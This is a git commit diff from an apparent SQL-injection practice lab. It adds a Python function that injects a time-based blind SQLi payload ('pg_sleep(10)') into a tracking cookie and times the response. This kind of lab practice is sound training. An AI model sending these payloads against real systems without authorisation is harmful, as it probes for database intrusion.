e6053d784a2b3d2c559585b5d9c543f713d47bbb
Jozenartes <jozenarts12@gmail.com>
2025-06-17 14:51:25 +0100

    Added payload check function

--- 05-SQL-Injection/Lab-02/Blind-SQLI.py
+++ 05-SQL-Injection/Lab-02/Blind-SQLI.py
@@ -8,6 +8,17 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 #Sending the requests to burp, to able to debug, incase of an error.
 proxies = {'http':'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
 
+def blind_sqli_check(url):
+    sqli_payload = "'|| pg_sleep(10)-- -"
+    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
+    cookies = {'TrackingId':'' + sqli_payload,'session':''}
+    r = requests.get(url,cookies=cookies,verify=False,proxies=proxies)
+    if int(r.elapsed.total_seconds()) > 10:
+        print("[+] Vulnerable to blind-based SQL injection")
+    else:
+        print("[-] Not Vulnerable to blind-based SQL injection")
+
+
 #method to launch the payload script correctly
 def main():
     if len(sys.argv) != 2:
@@ -18,6 +29,6 @@ def main():
     url = sys.argv[1]
     print("[+] Checking if tracking cookie is vulnerable to time-based blind SQLi..")
     blind_sqli_check(url)
-    
+
 if __name__ == "__main__":
     main()
